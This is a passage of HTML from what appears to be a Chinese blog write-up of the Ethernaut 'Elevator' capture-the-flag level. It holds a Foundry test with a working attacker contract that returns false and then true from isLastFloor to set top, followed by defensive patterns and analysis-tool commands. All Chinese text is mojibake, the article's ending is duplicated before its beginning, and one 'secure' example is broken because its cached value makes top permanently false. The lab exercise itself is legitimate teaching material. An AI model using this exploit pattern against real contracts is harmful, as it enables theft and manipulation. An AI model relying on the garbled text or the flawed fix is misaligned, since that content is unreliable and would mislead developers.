plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract SecureElevator &#123;</span><br><span class=\"line\">    uint public floor;</span><br><span class=\"line\">    bool public top;</span><br><span class=\"line\">    uint public topFloor = 10;  // å®šä¹‰æœ€é«˜å±‚</span><br><span class=\"line\">    </span><br><span class=\"line\">    function goTo(uint _floor) public &#123;</span><br><span class=\"line\">        require(_floor &lt;= topFloor, &quot;Floor too high&quot;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        floor = _floor;</span><br><span class=\"line\">        top = (_floor == topFloor);  // å†…éƒ¨åˆ¤æ–­é€»è¾‘</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\"><a href=\"#ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\" class=\"headerlink\" title=\"ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\"></a>ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯</h2><h3 id=\"æ¥å£å®‰å…¨æ£€æµ‹\"><a href=\"#æ¥å£å®‰å…¨æ£€æµ‹\" class=\"headerlink\" title=\"æ¥å£å®‰å…¨æ£€æµ‹\"></a>æ¥å£å®‰å…¨æ£€æµ‹</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// æ£€æµ‹æ¥å£å®ç°çš„ä¸€è‡´æ€§</span><br><span class=\"line\">contract InterfaceChecker &#123;</span><br><span class=\"line\">    function checkConsistency(address building, uint floor) public &#123;</span><br><span class=\"line\">        Building b = Building(building);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // å¤šæ¬¡è°ƒç”¨æ£€æŸ¥ä¸€è‡´æ€§</span><br><span class=\"line\">        bool result1 = b.isLastFloor(floor);</span><br><span class=\"line\">        bool result2 = b.isLastFloor(floor);</span><br><span class=\"line\">        </span><br><span class=\"line\">        require(result1 == result2, &quot;Inconsistent interface implementation&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"åˆçº¦åˆ†æå·¥å…·\"><a href=\"#åˆçº¦åˆ†æå·¥å…·\" class=\"headerlink\" title=\"åˆçº¦åˆ†æå·¥å…·\"></a>åˆçº¦åˆ†æå·¥å…·</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># ä½¿ç”¨ Slither æ£€æµ‹æ¥å£å®‰å…¨é—®é¢˜</span></span><br><span class=\"line\">slither . --detect external-function</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ä½¿ç”¨ Mythril åˆ†æ</span></span><br><span class=\"line\">Myth analyze &lt;contract.sol&gt; --execution-timeout 60</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ¯-æ€»ç»“\"><a href=\"#ğŸ¯-æ€»ç»“\" class=\"headerlink\" title=\"ğŸ¯ æ€»ç»“\"></a>ğŸ¯ æ€»ç»“</h2><p><strong>æ ¸å¿ƒæ¦‚å¿µ</strong>:</p>\n<ul>\n<li>æ¥å£æ˜¯ä¸€ç§æ— éœ€çŸ¥é“å®ç°ç»†èŠ‚å°±å¯ä»¥ä¸å…¶ä»–åˆçº¦äº¤äº’çš„æ–¹å¼</li>\n<li>ä½†æ°¸è¿œä¸è¦ç›²ç›®ç›¸ä¿¡å®ƒä»¬ï¼</li>\n<li>å¤šæ¬¡è°ƒç”¨å¤–éƒ¨å‡½æ•°å¯èƒ½äº§ç”Ÿä¸ä¸€è‡´çš„ç»“æœ</li>\n</ul>\n<p><strong>æ”»å‡»å‘é‡</strong>:</p>\n<ul>\n<li>å®ç°æ¶æ„çš„æ¥å£é€»è¾‘</li>\n<li>åˆ©ç”¨å¤šæ¬¡è°ƒç”¨ä¹‹é—´çš„çŠ¶æ€å˜åŒ–</li>\n<li>æ“çºµå‡½æ•°è¿”å›å€¼ä»¥è¾¾åˆ°æ”»å‡»ç›®çš„</li>\n</ul>\n<p><strong>é˜²å¾¡ç­–ç•¥</strong>:</p>\n<ul>\n<li>åªè°ƒç”¨ä¸€æ¬¡å¤–éƒ¨å‡½æ•°å¹¶ç¼“å­˜ç»“æœ</li>\n<li>ä½¿ç”¨ <code>view</code> å‡½æ•°ä¿®é¥°ç¬¦é˜²æ­¢çŠ¶æ€æ”¹å˜</li>\n<li>å®ç°ç™½åå•æœºåˆ¶æ§åˆ¶è®¿é—®</li>\n<li>å°½å¯èƒ½ä½¿ç”¨å†…éƒ¨é€»è¾‘è€Œä¸ä¾èµ–å¤–éƒ¨å®ç°</li>\n</ul>\n","more":"<h1 id=\"ğŸ¯-Ethernaut-Level-11-Elevator-æ¥å£å®ç°æ”»å‡»\"><a href=\"#ğŸ¯-Ethernaut-Level-11-Elevator-æ¥å£å®ç°æ”»å‡»\" class=\"headerlink\" title=\"ğŸ¯ Ethernaut Level 11: Elevator - æ¥å£å®ç°æ”»å‡»\"></a>ğŸ¯ Ethernaut Level 11: Elevator - æ¥å£å®ç°æ”»å‡»</h1><blockquote>\n<p><strong>å…³å¡é“¾æ¥</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/11\">Ethernaut Level 11 - Elevator</a><br><strong>æ”»å‡»ç±»å‹</strong>: æ¥å£å®ç°æ”»å‡»<br><strong>éš¾åº¦</strong>: â­â­â­â˜†â˜†</p>\n</blockquote>\n<h2 id=\"ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\"><a href=\"#ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\" class=\"headerlink\" title=\"ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\"></a>ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡</h2><p>ç›®çš„æ˜¯ä½¿ç”µæ¢¯è¾¾åˆ°æœ€é¡¶å±‚ï¼Œå³ä½¿é¢˜ç›®åˆçº¦çš„ <code>top</code> ä¸º <code>true</code>ã€‚å…³é”®åœ¨äºç†è§£æ¥å£å®šä¹‰ä¸å®é™…å®ç°çš„å·®åˆ«ï¼Œä»¥åŠå¦‚ä½•åˆ©ç”¨è¿™ä¸ªå·®åˆ«è¿›è¡Œæ”»å‡»ã€‚</p>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel11.svg\" alt=\"Elevator Requirements\"></p>\n<h2 id=\"ğŸ”-æ¼æ´åˆ†æ\"><a href=\"#ğŸ”-æ¼æ´åˆ†æ\" class=\"headerlink\" title=\"ğŸ” æ¼æ´åˆ†æ\"></a>ğŸ” æ¼æ´åˆ†æ</h2><h3 id=\"æ¥å£çš„å®‰å…¨é£é™©\"><a href=\"#æ¥å£çš„å®‰å…¨é£é™©\" class=\"headerlink\" title=\"æ¥å£çš„å®‰å…¨é£é™©\"></a>æ¥å£çš„å®‰å…¨é£é™©</h3><p>æœ¬å…³å¡é‡åœ¨è€ƒéªŒæˆ‘ä»¬å¯¹æ™ºèƒ½åˆçº¦æ¥å£çš„è®¤çŸ¥ç¨‹åº¦ï¼š</p>\n<ul>\n<li><strong>æ¥å£å®šä¹‰å‡½æ•°ç­¾åï¼Œä½†ä¸å®šä¹‰å®ƒä»¬çš„é€»è¾‘</strong></li>\n<li>è¿™æ˜¯ä¸€ç§æ— éœ€çŸ¥é“å®ç°ç»†èŠ‚å°±å¯ä»¥ä¸å…¶ä»–åˆçº¦äº¤äº’çš„æ–¹æ³•</li>\n<li>ä½†ä¹Ÿæ„å‘³ç€æ”»å‡»è€…å¯ä»¥æ§åˆ¶æ¥å£çš„å®ç°é€»è¾‘</li>\n</ul>\n<h3 id=\"å…³é”®æ¼æ´ä»£ç \"><a href=\"#å…³é”®æ¼æ´ä»£ç \" class=\"headerlink\" title=\"å…³é”®æ¼æ´ä»£ç \"></a>å…³é”®æ¼æ´ä»£ç </h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function goTo(uint _floor) public &#123;</span><br><span class=\"line\">    Building building = Building(msg.sender);</span><br><span class=\"line\"></span><br><span class=\"line\">    if (!building.isLastFloor(_floor)) &#123;</span><br><span class=\"line\">      floor = _floor;</span><br><span class=\"line\">      top = building.isLastFloor(floor);  // ç¬¬äºŒæ¬¡è°ƒç”¨ï¼</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"æ”»å‡»å‘é‡\"><a href=\"#æ”»å‡»å‘é‡\" class=\"headerlink\" title=\"æ”»å‡»å‘é‡\"></a>æ”»å‡»å‘é‡</h3><p>åœ¨ <code>goTo</code> å‡½æ•°ä¸­ï¼Œ<code>isLastFloor</code> è¢«è°ƒç”¨ä¸¤æ¬¡ï¼š</p>\n<ol>\n<li><strong>ç¬¬ä¸€æ¬¡è°ƒç”¨</strong>ï¼šå¿…é¡»è¿”å› <code>false</code>ï¼Œå¦åˆ™æ— æ³•è¿›å…¥ä¿®æ”¹ <code>top</code> çš„é€»è¾‘</li>\n<li><strong>ç¬¬äºŒæ¬¡è°ƒç”¨</strong>ï¼šæˆ‘ä»¬å¯ä»¥è®©å®ƒè¿”å› <code>true</code> æ¥è®¾ç½® <code>top = true</code></li>\n</ol>\n<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡åˆ›å»ºä¸€ä¸ª <code>isLastFloor()</code> æ¥åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œå®ƒå°†ç¬¬ä¸€æ¬¡è¿”å› <code>false</code>ï¼Œç¬¬äºŒæ¬¡è¿”å› <code>true</code>ã€‚</p>\n<h2 id=\"ğŸ’»-Foundry-å®ç°\"><a href=\"#ğŸ’»-Foundry-å®ç°\" class=\"headerlink\" title=\"ğŸ’» Foundry å®ç°\"></a>ğŸ’» Foundry å®ç°</h2><h3 id=\"æ”»å‡»åˆçº¦ä»£ç \"><a href=\"#æ”»å‡»åˆçº¦ä»£ç \" class=\"headerlink\" title=\"æ”»å‡»åˆçº¦ä»£ç \"></a>æ”»å‡»åˆçº¦ä»£ç </h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;../src/Ethernaut.sol&quot;;</span><br><span class=\"line\">import &quot;../src/levels/ElevatorFactory.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">interface Building &#123;</span><br><span class=\"line\">    function isLastFloor(uint) external returns (bool);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract ElevatorAttacker is Building &#123;</span><br><span class=\"line\">    Elevator instance;</span><br><span class=\"line\">    bool top = false;</span><br><span class=\"line\"></span><br><span class=\"line\">    constructor(address _elevator) &#123;</span><br><span class=\"line\">        instance = Elevator(_elevator);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // å…³é”®ï¼šçŠ¶æ€å˜åŒ–çš„æ¥å£å®ç°</span><br><span class=\"line\">    function isLastFloor(uint _floor) external override returns (bool) &#123;</span><br><span class=\"line\">        top = !top;  // ç¬¬ä¸€æ¬¡è°ƒç”¨æ—¶ top å˜ä¸º trueï¼Œç¬¬äºŒæ¬¡å˜ä¸º false</span><br><span class=\"line\">        return !top; // ç¬¬ä¸€æ¬¡è¿”å› falseï¼Œç¬¬äºŒæ¬¡è¿”å› true</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function attack(uint _floor) public &#123;</span><br><span class=\"line\">        instance.goTo(_floor);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract ElevatorTest is Test &#123;</span><br><span class=\"line\">    Ethernaut ethernaut;</span><br><span class=\"line\">    ElevatorFactory elevatorFactory;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        ethernaut = new Ethernaut();</span><br><span class=\"line\">        elevatorFactory = new ElevatorFactory();</span><br><span class=\"line\">        ethernaut.registerLevel(elevatorFactory);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function testElevatorExploit() public &#123;</span><br><span class=\"line\">        // åˆ›å»ºå…³å¡å®ä¾‹</span><br><span class=\"line\">        address levelInstance = ethernaut.createLevelInstance(elevatorFactory);</span><br><span class=\"line\">        Elevator instance = Elevator(levelInstance);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // æ£€æŸ¥åˆå§‹çŠ¶æ€</span><br><span class=\"line\">        assertEq(instance.top(), false);</span><br><span class=\"line\">        assertEq(instance.floor(), 0);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // éƒ¨ç½²æ”»å‡»åˆçº¦</span><br><span class=\"line\">        ElevatorAttacker attacker = new ElevatorAttacker(levelInstance);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // æ‰§è¡Œæ”»å‡»</span><br><span class=\"line\">        attacker.attack(1);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // éªŒè¯æ”»å‡»æˆåŠŸ</span><br><span class=\"line\">        assertEq(instance.top(), true);</span><br><span class=\"line\">        assertEq(instance.floor(), 1);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // æäº¤å…³å¡</span><br><span class=\"line\">        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(</span><br><span class=\"line\">            payable(levelInstance)</span><br><span class=\"line\">        );</span><br><span class=\"line\">        assert(levelSuccessfullyPassed);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"å…³é”®æ”»å‡»æ­¥éª¤\"><a href=\"#å…³é”®æ”»å‡»æ­¥éª¤\" class=\"headerlink\" title=\"å…³é”®æ”»å‡»æ­¥éª¤\"></a>å…³é”®æ”»å‡»æ­¥éª¤</h3><ol>\n<li><strong>å®ç° Building æ¥å£</strong>ï¼šåˆ›å»ºä¸€ä¸ªåˆçº¦å®ç° <code>Building</code> æ¥å£</li>\n<li><strong>çŠ¶æ€å˜åŒ–é€»è¾‘</strong>ï¼šåœ¨ <code>isLastFloor()</code> ä¸­å®ç°çŠ¶æ€å˜åŒ–</li>\n<li><strong>è°ƒç”¨ goTo å‡½æ•°</strong>ï¼šé€šè¿‡æ”»å‡»åˆçº¦è°ƒç”¨ <code>goTo()</code></li>\n<li><strong>éªŒè¯ç»“æœ</strong>ï¼šæ£€æŸ¥ <code>top</code> æ˜¯å¦ä¸º <code>true</code></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// çŠ¶æ€å˜åŒ–çš„å…³é”®å®ç°</span><br><span class=\"line\">function isLastFloor(uint _floor) external override returns (bool) &#123;</span><br><span class=\"line\">    top = !top;  // åˆ‡æ¢çŠ¶æ€</span><br><span class=\"line\">    return !top; // ç¬¬ä¸€æ¬¡è¿”å› falseï¼Œç¬¬äºŒæ¬¡è¿”å› true</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ›¡ï¸-é˜²å¾¡æªæ–½\"><a href=\"#ğŸ›¡ï¸-é˜²å¾¡æªæ–½\" class=\"headerlink\" title=\"ğŸ›¡ï¸ é˜²å¾¡æªæ–½\"></a>ğŸ›¡ï¸ é˜²å¾¡æªæ–½</h2><h3 id=\"1-é¿å…å¤šæ¬¡è°ƒç”¨å¤–éƒ¨å‡½æ•°\"><a href=\"#1-é¿å…å¤šæ¬¡è°ƒç”¨å¤–éƒ¨å‡½æ•°\" class=\"headerlink\" title=\"1. é¿å…å¤šæ¬¡è°ƒç”¨å¤–éƒ¨å‡½æ•°\"></a>1. é¿å…å¤šæ¬¡è°ƒç”¨å¤–éƒ¨å‡½æ•°</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// âŒ ä¸å®‰å…¨ï¼šå¤šæ¬¡è°ƒç”¨å¤–éƒ¨å‡½æ•°</span><br><span class=\"line\">contract VulnerableElevator &#123;</span><br><span class=\"line\">    function goTo(uint _floor) public &#123;</span><br><span class=\"line\">        Building building = Building(msg.sender);</span><br><span class=\"line\">        </span><br><span class=\"line\">        if (!building.isLastFloor(_floor)) &#123;  // ç¬¬ä¸€æ¬¡è°ƒç”¨</span><br><span class=\"line\">            floor = _floor;</span><br><span class=\"line\">            top = building.isLastFloor(floor);  // ç¬¬äºŒæ¬¡è°ƒç”¨ï¼</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// âœ… å®‰å…¨ï¼šåªè°ƒç”¨ä¸€æ¬¡å¹¶ç¼“å­˜ç»“æœ</span><br><span class=\"line\">contract SecureElevator &#123;</span><br><span class=\"line\">    function goTo(uint _floor) public &#123;</span><br><span class=\"line\">        Building building = Building(msg.sender);</span><br><span class=\"line\">        </span><br><span class=\"line\">        bool isLast = building.isLastFloor(_floor);  // åªè°ƒç”¨ä¸€æ¬¡</span><br><span class=\"line\">        </span><br><span class=\"line\">        if (!isLast) &#123;</span><br><span class=\"line\">            floor = _floor;</span><br><span class=\"line\">            top = isLast;  // ä½¿ç”¨ç¼“å­˜çš„ç»“æœ</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-ä½¿ç”¨-view-å‡½æ•°\"><a href=\"#2-ä½¿ç”¨-view-å‡½æ•°\" class=\"headerlink\" title=\"2. ä½¿ç”¨ view å‡½æ•°\"></a>2. ä½¿ç”¨ view å‡½æ•°</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// âœ… ä½¿ç”¨ view å‡½æ•°é˜²æ­¢çŠ¶æ€æ”¹å˜</span><br><span class=\"line\">interface Building &#123;</span><br><span class=\"line\">    function isLastFloor(uint) external view returns (bool);  // view ä¿®é¥°ç¬¦</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract SecureElevator &#123;</span><br><span class=\"line\">    function goTo(uint _floor) public &#123;</span><br><span class=\"line\">        Building building = Building(msg.sender);</span><br><span class=\"line\">        </span><br><span class=\"line\">        if (!building.isLastFloor(_floor)) &#123;</span><br><span class=\"line\">            floor = _floor;</span><br><span class=\"line\">            top = building.isLastFloor(floor);  // view å‡½æ•°ä¿è¯ä¸€è‡´æ€§</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-ä½¿ç”¨ç™½åå•æœºåˆ¶\"><a href=\"#3-ä½¿ç”¨ç™½åå•æœºåˆ¶\" class=\"headerlink\" title=\"3. ä½¿ç”¨ç™½åå•æœºåˆ¶\"></a>3. ä½¿ç”¨ç™½åå•æœºåˆ¶</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract SecureElevator &#123;</span><br><span class=\"line\">    mapping(address =&gt; bool) public approvedBuildings;</span><br><span class=\"line\">    address public owner;</span><br><span class=\"line\">    </span><br><span class=\"line\">    modifier onlyApprovedBuilding() &#123;</span><br><span class=\"line\">        require(approvedBuildings[msg.sender], &quot;Unauthorized building&quot;);</span><br><span class=\"line\">        _;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function addApprovedBuilding(address building) public &#123;</span><br><span class=\"line\">        require(msg.sender == owner);</span><br><span class=\"line\">        approvedBuildings[building] = true;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function goTo(uint _floor) public onlyApprovedBuilding &#123;</span><br><span class=\"line\">        // å®‰å…¨é€»è¾‘</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"4-å®ç°å†…éƒ¨é€»è¾‘\"><a href=\"#4-å®ç°å†…éƒ¨é€»è¾‘\" class=\"headerlink\" title=\"4. å®ç°å†…éƒ¨é€»è¾‘\"></a>4. å®ç°å†…éƒ¨é€»è¾‘</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract SecureElevator &#123;</span><br><span class=\"line\">    uint public floor;</span><br><span class=\"line\">    bool public top;</span><br><span class=\"line\">    uint public topFloor = 10;  // å®šä¹‰æœ€é«˜å±‚</span><br><span class=\"line\">    </span><br><span class=\"line\">    function goTo(uint _floor) public &#123;</span><br><span class=\"line\">        require(_floor &lt;= topFloor, &quot;Floor too high&quot;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        floor = _floor;</span><br><span class=\"line\">        top = (_floor == topFloor);  // å†…éƒ¨åˆ¤æ–­é€»è¾‘</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\"><a href=\"#ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\" class=\"headerlink\" title=\"ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\"></a>ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯</h2><h3 id=\"æ¥å£å®‰å…¨æ£€æµ‹\"><a href=\"#æ¥å£å®‰å…¨æ£€æµ‹\" class=\"headerlink\" title=\"æ¥å£å®‰å…¨æ£€æµ‹\"></a>æ¥å£å®‰å…¨æ£€æµ‹</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// æ£€æµ‹æ¥å£å®ç°çš„ä¸€è‡´æ€§</span><br><span class=\"line\">contract InterfaceChecker &#123;</span><br><span class=\"line\">    function checkConsistency(address building, uint floor) public &#123;</span><br><span class=\"line\">        Building b = Building(building);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // å¤šæ¬¡è°ƒç”¨æ£€æŸ¥ä¸€è‡´æ€§</span><br><span class=\"line\">        bool result1 = b.isLastFloor(floor);</span><br><span class=\"line\">        bool result2 = b.isLastFloor(floor);</span><br><span class=\"line\">        </span><br><span class=\"line\">        require(result1 == result2, &quot;Inconsistent interface implementation&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"åˆçº¦åˆ†æå·¥å…·\"><a href=\"#åˆçº¦åˆ†æå·¥å…·\" class=\"headerlink\" title=\"åˆçº¦åˆ†æå·¥å…·\"></a>åˆçº¦åˆ†æå·¥å…·</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># ä½¿ç”¨ Slither æ£€æµ‹æ¥å£å®‰å…¨é—®é¢˜</span></span><br><span class=\"line\">slither . --detect external-function</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ä½¿ç”¨ Mythril åˆ†æ</span></span><br><span class=\"line\">Myth analyze &lt;contract.sol&gt; --execution-timeout 60</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ¯-æ€»ç»“\"><a href=\"#ğŸ¯-æ€»ç»“\" class=\"headerlink\" title=\"ğŸ¯ æ€»ç»“\"></a>ğŸ¯ æ€»ç»“</h2><p><strong>æ ¸å¿ƒæ¦‚å¿µ</strong>:</p>\n<ul>\n<li>æ¥å£æ˜¯ä¸€ç§æ— 